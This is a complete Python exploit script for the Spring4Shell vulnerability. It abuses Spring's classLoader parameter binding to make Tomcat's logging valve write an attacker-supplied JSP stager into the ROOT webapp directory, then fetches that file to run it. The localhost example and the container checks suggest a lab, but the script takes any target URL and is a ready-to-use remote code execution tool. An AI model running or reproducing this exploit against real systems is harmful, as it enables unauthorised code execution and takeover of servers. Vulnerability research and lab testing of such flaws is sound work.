#!/usr/bin/env python3
import sys
import time
import requests

# ─── Arg parsing ──────────────────────────────────────────────────────────────
if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <TARGET_URL>")
    sys.exit(1)

TARGET_URL  = sys.argv[1].rstrip("/") + "/"   # e.g. "http://127.0.0.1:8080/"
STAGER_PATH = "payload.jsp"                    # your local JSP

# ─── Deploy JSP via Spring4Shell ─────────────────────────────────────────────
def deploy_stager():
    print("[+] Loading JSP stager…")
    try:
        with open(STAGER_PATH, "r") as f:
            jsp = f.read()
    except IOError as e:
        print(f"[-] Cannot open {STAGER_PATH}: {e}")
        sys.exit(1)

    print(f"[*] JSP length = {len(jsp)} bytes")
    if not jsp.strip():
        print("[-] JSP file is empty!")
        sys.exit(1)

    # build the 5 parameters
    filename = STAGER_PATH.rsplit(".", 1)[0]  # "payload"
    form_fields = {
        # 1) JSP body
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": jsp,
        # 2) Force .jsp
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
        # 3) ABSOLUTE path into the exploded ROOT webapp
        "class.module.classLoader.resources.context.parent.pipeline.first.directory":
            "/usr/local/tomcat/webapps/ROOT",
        # 4) Base name
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": filename,
        # 5) No timestamp
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ""
    }

    print(f"[+] Firing exploit POST to {TARGET_URL}")
    resp = requests.post(
        TARGET_URL,
        data=form_fields,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=5
    )
    print(f"[*] Exploit request → HTTP {resp.status_code} (expected ~200/404)")

    # ─── Verify INSIDE the container ────────────────────────────────────────────
    print("[*] Now exec into the container and run:")
    print("    find /usr/local/tomcat/webapps/ROOT -name payload.jsp")
    print("  to see if the file is really there.")
    print("  If you see it, you can curl it from the host:")
    print("    curl -I http://127.0.0.1:8080/payload.jsp")

# ─── Trigger the JSP stager ───────────────────────────────────────────────────
def trigger_stager():
    url = TARGET_URL + "payload.jsp"
    print(f"[+] Triggering {url} …")
    r = requests.get(url, timeout=5)
    print(f"[*] Trigger GET → HTTP {r.status_code}")

# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    print("── Stage0 Exploit Launcher ──")
    deploy_stager()
    time.sleep(2)
    trigger_stager()

if __name__=="__main__":
    main()
